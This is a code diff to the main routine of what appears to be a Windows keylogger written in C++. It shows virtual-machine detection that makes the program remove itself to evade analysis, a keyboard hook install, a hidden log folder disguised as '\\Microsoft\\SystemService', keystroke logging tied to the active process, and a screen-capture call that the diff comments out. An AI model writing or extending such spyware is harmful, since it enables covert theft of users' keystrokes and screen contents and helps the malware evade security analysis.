@@ -14,6 +14,7 @@ int main() {
 
 #ifndef DEBUG_BUILD
   if (Sys::CheckForVirtualMachine()) {
+    DEB("Virtual Machine")
 	KeyHook::UninstallHook();
 	Sys::RemoveFromRegistry();
 	KeyHook::KillProcess();
@@ -23,17 +24,19 @@ int main() {
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
 
-  Stream::GetAccountInfo(pUserData);
+  std::string path = Stream::GetPath("\\Microsoft\\SystemService");
 
-  Stream::MakeDir(Stream::GetPath("\\Microsoft\\SystemService"));
+  Stream::MakeDir(path);
   Stream::MakeFile();
 
-  Stream::WriteLog("[*] BOOT [*]", pUserData->activeProcess, true);
-
-  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
+  Stream::WriteLog("[*] BOOT [*]",
+				   KeyHook::activeProcess,
+				   false); // FIXME ProcessChanged always true? value not updated?
+  /*Screen::CaptureScreen(path,
 						"winpst",
 						true,
-						120.0f);
+						60000);
+						*/
 
   KeyHook::HandleMessage(true);
 #endif // DEBUG_BUILD
